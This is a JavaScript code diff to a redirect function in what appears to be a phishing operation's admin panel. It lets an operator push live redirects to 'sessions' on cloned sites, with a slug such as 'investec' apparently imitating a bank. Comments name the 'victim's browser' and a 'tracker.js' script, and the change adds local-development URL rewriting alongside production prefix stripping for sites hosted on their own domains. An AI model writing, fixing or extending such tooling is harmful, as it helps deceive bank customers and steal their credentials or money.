@@ -48,30 +48,53 @@ async function evaluateRules(session, isAdminOnline) {
  * @param {string} targetUrl - The URL to redirect to
  * @param {number|null} adminUserId - The admin user who triggered the redirect
  */
-async function executeRedirect(io, sessionId, targetUrl, adminUserId) {
+async function executeRedirect(io, sessionId, targetUrl, adminUserId, options = {}) {
   const db = getAdapter();
 
   const session = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);
   if (!session) return;
 
-  // If the website is hosted on its own VPS/domain, strip the /<slug>/ prefix
-  // so redirects work against the site's root (e.g. "/investec/error" → "/error").
+  // URL normalization based on where the admin's server lives:
+  //  - LOCAL DEV (isLocal): rewrite to /demo/<slug>/<page> so slug-based routes work.
+  //  - PRODUCTION: strip /<slug>/ prefix when website is hosted on its own domain.
+  // isLocal is set by routes/sessions.js based on the request's Host header.
   try {
+    const isLocal = !!options.isLocal;
     const website = await db.get(`
       SELECT w.demo_slug, w.deploy_domain, w.domain, w.domain_active,
         (SELECT d.domain FROM domains d WHERE d.website_id = w.id AND d.status = 'live' LIMIT 1) AS live_domain
       FROM websites w WHERE w.id = ?
     `, [session.website_id]);
-    const hasOwnDomain = website && (website.deploy_domain || (website.domain && website.domain_active) || website.live_domain);
-    if (hasOwnDomain && website.demo_slug) {
-      const slug = website.demo_slug;
-      const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-      const original = targetUrl;
-      // Strip /demo/<slug>/ or /<slug>/ prefix
-      targetUrl = targetUrl.replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/');
-      targetUrl = targetUrl.replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/');
-      if (targetUrl !== original) {
-        console.log(`[redirect] stripped slug for hosted site: ${original} → ${targetUrl}`);
+
+    if (isLocal) {
+      // Force /demo/<slug>/<page> form so victim's browser (even with cached
+      // old tracker.js) navigates to a slug-based route that Express can serve.
+      if (website && website.demo_slug && targetUrl && !/^https?:\/\//i.test(targetUrl) && targetUrl.charAt(0) === '/') {
+        const slug = website.demo_slug;
+        const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const original = targetUrl;
+        // Strip any existing /demo/<slug>/ or /<slug>/ prefix, then rebuild cleanly
+        let pagePart = targetUrl
+          .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
+          .replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/')
+          .replace(/^\//, '');
+        targetUrl = '/demo/' + slug + '/' + pagePart;
+        if (targetUrl !== original) {
+          console.log(`[redirect] local dev — rewrote URL: ${original} → ${targetUrl}`);
+        }
+      }
+    } else {
+      const hasOwnDomain = website && (website.deploy_domain || (website.domain && website.domain_active) || website.live_domain);
+      if (hasOwnDomain && website.demo_slug) {
+        const slug = website.demo_slug;
+        const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const original = targetUrl;
+        // Strip /demo/<slug>/ or /<slug>/ prefix
+        targetUrl = targetUrl.replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/');
+        targetUrl = targetUrl.replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/');
+        if (targetUrl !== original) {
+          console.log(`[redirect] stripped slug for hosted site: ${original} → ${targetUrl}`);
+        }
       }
     }
   } catch {}
